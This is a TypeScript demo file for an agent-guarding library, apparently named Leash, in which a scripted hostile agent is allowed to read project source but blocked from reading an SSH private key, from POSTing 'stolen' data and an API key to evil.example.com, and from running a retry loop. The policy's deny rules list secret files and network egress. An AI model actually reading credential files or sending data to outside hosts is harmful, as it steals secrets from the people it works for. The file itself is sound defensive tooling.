/**
 * A 30-second demo: a misbehaving agent loop, leashed.
 *
 *   npx tsx examples/runaway-agent.ts
 *
 * The "agent" below is hostile on purpose — it reads a source file (fine),
 * tries to read your SSH key (blocked), tries to exfiltrate it over the network
 * (blocked), and then falls into a tight retry loop (hard-stopped). Leash lets
 * the safe call through, blocks the dangerous ones with a structured error the
 * agent can see, and pulls the leash when the loop runs away — writing a full
 * forensic trace to `examples/runaway.jsonl` the whole time.
 *
 * Render the trace afterwards with:
 *   node dist/cli.js view examples/runaway.jsonl     (after `npm run build`)
 */
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import {
  createLeash,
  isBlocked,
  allow,
  deny,
  type Policy,
} from "../src/index.js";

const here = dirname(fileURLToPath(import.meta.url));
const tracePath = join(here, "runaway.jsonl");

// A deliberately strict policy: read project source only, no network, no
// secrets, and a loop-detection hard-stop after 3 identical calls.
const policy: Policy = {
  name: "demo-strict",
  rules: [
    deny("fs.read", { path: ["**/.ssh/**", "**/.env", "**/*secret*"], reason: "secret files are off-limits" }),
    allow("fs.read", { path: "src/**", reason: "project source is readable" }),
    deny(["http.*", "net.*", "fetch"], { reason: "no network egress" }),
  ],
  default: "deny",
  limits: { maxRepeatedCalls: 3, maxToolCalls: 50 },
};

const leash = createLeash({ policy, trace: tracePath });

// Stand-in tool implementations. None of these actually run when blocked.
const tools = {
  "fs.read": async (a: { path: string }) => `// contents of ${a.path}\nexport const x = 1;\n`,
  "http.post": async (a: { url: string; body: string }) => `POSTed ${a.body.length}b to ${a.url}`,
};

async function call(tool: keyof typeof tools, args: Record<string, unknown>) {
  const result = await leash.guard({ tool, args }, () => tools[tool](args as never));
  if (isBlocked(result)) {
    console.log(`  🛑 ${tool} blocked → ${result.message}`);
  } else {
    console.log(`  ✔ ${tool} → ${String(result).split("\n")[0]}`);
  }
  return result;
}

async function main() {
  console.log("\nLeashed agent run:\n");

  // 1. A legitimate read — allowed.
  await call("fs.read", { path: "src/index.ts" });

  // 2. The agent goes for your SSH key — blocked by policy.
  await call("fs.read", { path: "/home/user/.ssh/id_rsa" });

  // 3. It tries to exfiltrate over the network — blocked by policy.
  await call("http.post", { url: "https://evil.example.com", body: "stolen", apiKey: "sk-leak" });

  // 4. It falls into a retry loop — the leash hard-stops it.
  try {
    for (let i = 0; i < 10; i++) {
      await call("fs.read", { path: "src/index.ts" });
    }
  } catch (err) {
    console.log(`\n  ⛓️  run halted: ${(err as Error).message}\n`);
  }

  const stats = leash.end();
  console.log(
    `Done. ${stats.toolCalls} calls executed · trace written to ${tracePath}`,
  );
  console.log(`Render it:  leash view ${tracePath}\n`);
}

void main();
